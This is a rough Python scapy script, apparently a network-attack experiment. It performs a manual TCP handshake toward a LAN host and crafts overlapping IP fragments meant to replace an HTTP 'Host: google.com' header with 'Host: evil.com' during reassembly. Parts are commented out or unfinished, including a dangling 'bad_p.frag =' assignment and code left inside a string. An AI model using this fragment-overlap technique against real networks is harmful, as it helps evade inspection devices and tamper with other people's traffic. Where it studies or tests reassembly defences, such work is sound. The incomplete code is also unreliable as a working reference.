# create two IP packets, one with 1480 payload bytes and one with 4 payload bytes
# initial payload is TCP with sport/dport being 9999
from scapy.all import *



dstIP = "127.0.0.1"
#frags = fragment(IP(dst=dstIP)/TCP(sport=8000, dport=80)/("HTTP/1.1 GET /?q=xxxxx\nHost: google.com\n\nxxxHost:jordon.me\n\n"),63)

#frags[1][IP].frag = 7 

orig_host = "Host: google.com\n\n"
new = "Host: evil.com\n\nthis packet is longer"
s = "HTTP/1.1 GET /?aaaaaaaa\n"
l = len(s)

#send(IP(dst=dstIP / TCP(sport=8000, dport=8080)))
src = '192.168.1.78'
dst = '192.168.1.80'
sport = 8000
dport = 8080

# SYN
ip=IP(src=src,dst=dst)
SYN=TCP(sport=sport,dport=dport,flags='S',seq=1000)
#send(ip/SYN)
SYNACK=sr1(ip/SYN)

# ACK
print(SYNACK.ack)
print(SYNACK.seq)
ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
send(ip/ACK)
pkt1 = ip/TCP(sport=8000, dport=8080, flags='P', seq=SYNACK.ack+1) / (s + orig_host)
pkt2 = ip / TCP(sport=8000, dport=8080) / (s + new)

pkts = fragment(pkt1, l + 20)
print(pkts)
pkts_evil = fragment(pkt2, l + 20)

send(pkt1)
#bad_p = pkts_evil[1]
#send(bad_p)
ACK=TCP(sport=sport, dport=dport, flags='F', seq=1044)
sr1(ip/ACK)

#bad_p.frag = 

"""
pkts = scapy.plist.PacketList()
# TCP(sport=8000, dport=80)/(
pkts.append(IP(dst=dstIP, flags="MF", frag=0)/("a" * 20 + "HTTP/1.1 GET /?=aaaa"))
pkts.append(IP(dst=dstIP, flags="MF", frag=5)/(orig_host + 'a'*(24 - len(orig_host))))
pkts.append(IP(dst=dstIP, flags="MF", frag=7)/("3"*32))
pkts.append(IP(dst=dstIP, flags="MF", frag=2)/("4"*16 + new + '4'*(40 - 16 - len(new))))
pkts.append(IP(dst=dstIP, flags="MF", frag=7)/("5"*32))
pkts.append(IP(dst=dstIP,  frag=10)/("6"*32))
send(pkts)

def s1():
    send(frags[0])
    
def s2():
    send(frags[1])
s1()
s2()"""
